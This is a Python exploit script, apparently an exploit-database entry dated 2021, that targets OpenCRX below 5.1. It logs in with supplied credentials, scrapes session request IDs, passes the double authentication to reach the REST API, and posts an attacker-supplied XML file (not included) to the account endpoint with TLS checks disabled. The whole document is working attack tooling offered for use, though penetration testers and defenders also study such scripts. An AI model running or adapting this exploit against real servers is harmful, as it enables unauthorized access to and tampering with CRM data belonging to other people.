#!/usr/bin/python3

# Exploit Title: OpenCRX XML Injector
# Date: 2021-07-24
# Exploit Author: Youssef B
# Tested against: OpenCRX < 5.1

import requests, argparse, re, base64

from requests.models import Response

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--user', help='Username to login with', required=True)
parser.add_argument('-p', '--password', help='Username\'s password', required=True)
parser.add_argument('-t', '--target', help='Specify a valid target url', required=True)
args = parser.parse_args()

target = args.target

def hsession():
    s = requests.Session()
    return s

s = hsession()

def b64():
    item = args.user + ':' + args.password
    item_bytes = item.encode('ascii')
    base64_bytes = base64.b64encode(item_bytes)
    base64_item = base64_bytes.decode('ascii')

    print("Password encoded to b64: %s\n" % base64_item)

    return base64_item

def login(t):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data    = 'j_username=%s&j_password=%s' % (args.user, args.password)
    posturl = t + 'j_security_check'
    geturl  = t + 'ObjectInspectorServlet'

    s.get(geturl)
    con = s.post(posturl, headers=headers, data=data, allow_redirects=True, verify=False)

    html    = con.content.decode('utf-8')
    regid   = r".*requestId=(.*)&event.*?"
    evgid   = r".*event=(\d*)&parameter"
    reqid   = re.findall(regid, html)
    evtid   = re.findall(evgid, html)
    strid   = ""
    reqid   = strid.join(reqid)
    evtid   = strid.join(evtid)

    params = (
        ('requestId', reqid),
        ('event', evtid),
        ('parameter', 'xri*(xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/admin-Standard)')
    )

    response    = s.get(geturl, params=params, verify=False)

    html    = response.content.decode('utf-8')
    if "<title>openCRX - %s, (%s) - Home</title>" % (args.user, args.user) in html:
        print("Successfully logged in.")
    else:
        print("Unable to login.")
        exit(1)

    referer     = response.url

    return s, reqid, referer


# Because of double authentication, need to get the api page twice, one time here and another get in the next function
def getapipage(t):
    s, reqid, _ = login(t + '/opencrx-core-CRX/')

    target     = t + '/opencrx-core-CRX/ObjectInspectorServlet'    
    params     = (
        ('requestId', reqid),
        ('event', '6'),
        ('parameter', 'xri*(xri://@openmdx*org.opencrx.kernel.account1/provider/CRX/segment/Standard)')
    )

    res = s.get(target, params=params, verify=False)

    referer = res.url

    apitarget   = t + '/opencrx-rest-CRX/api-ui/index.html'
    apiheaders  = {
        'Referer': referer
    }
    apiparams = (
        ('xri', 'xri://@openmdx*org.opencrx.kernel.account1/provider/CRX/segment/Standard'),
        ('requestId', reqid)
    )

    apires = s.get(apitarget, headers=apiheaders, params=apiparams, verify=False)
    ref = apires.url

    return s, ref


def xmlexploit(t):
    auth        = 'Basic ' + b64()
    s, referer  = getapipage(t)

    apitarget   = t + '/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/:api-ui'
    apiheaders = {
        'Authorization': auth,
        'Referer': referer
    }

    res = s.get(apitarget, headers=apiheaders, verify=False)
    ref = res.url


    ptarget = t + '/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account'
    pheaders = {
        'Authorization': auth,
        'Content-Type': 'application/xml',
        'Referer': ref
    }

    xml_file = "data.xml"
    with open(xml_file) as xml:
        res = s.post(ptarget, headers=pheaders, data=xml, verify=False)
        print(res.content)


if __name__ == '__main__':
    xmlexploit(target)
